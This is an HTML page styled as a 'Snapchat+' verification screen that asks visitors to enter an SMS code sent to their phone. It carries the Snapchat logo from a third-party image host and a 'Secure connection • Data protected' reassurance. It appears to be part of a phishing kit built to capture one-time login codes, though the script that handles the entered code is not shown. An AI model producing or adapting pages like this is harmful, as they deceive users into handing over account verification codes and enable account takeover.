<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Snapchat+ Verification Code</title>
    <link rel="stylesheet" href="style.css" />
</head>
<body>
    <div class="bg-gif"></div>
    <div class="container">
        <div class="main-card code-card">
            <div class="code-header">
                <img src="https://cdn.imgbin.com/13/25/13/social-media-icon-snapchat-icon-6kBmyR3B.jpg" alt="Snapchat" class="code-logo" />
                <h1>Verification Code</h1>
                <p>An SMS code has been sent to <strong id="codePhone">--</strong></p>
            </div>

            <div class="code-inputs" id="codeInputs"></div>

            <button onclick="verifyCode()" id="verifyBtn" class="btn-primary">
                ✅ Verify Code
            </button>

            <div id="codeStatus" class="status-message"></div>

            <div class="val-footer" style="margin-top:24px;">
                <p>🔒 Secure connection • Data protected</p>
            </div>
        </div>
    </div>

    <script src="code.js"></script>
</body>
</html>
